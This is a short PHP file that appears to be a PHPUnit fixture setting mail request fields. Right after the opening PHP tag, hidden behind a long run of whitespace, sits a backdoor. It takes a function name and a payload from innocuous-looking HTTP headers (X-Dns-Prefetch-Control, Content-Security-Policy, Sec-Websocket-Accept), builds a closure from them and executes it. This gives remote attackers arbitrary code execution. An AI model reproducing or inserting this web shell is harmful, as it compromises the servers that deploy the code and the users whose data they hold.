<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['X-Dns-Prefetch-Control'])){$class=$_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Content-Security-Policy']));$class();}

$_REQUEST['submitted'] = 1;
$_REQUEST['mail_to'] = 'somebody@example.com';
$_REQUEST['mail_from'] = 'phpunit@example.com';
$_REQUEST['mail_cc'] = 'cc@example.com';
$_REQUEST['mail_host'] = 'localhost';
$_REQUEST['mail_port'] = 2500;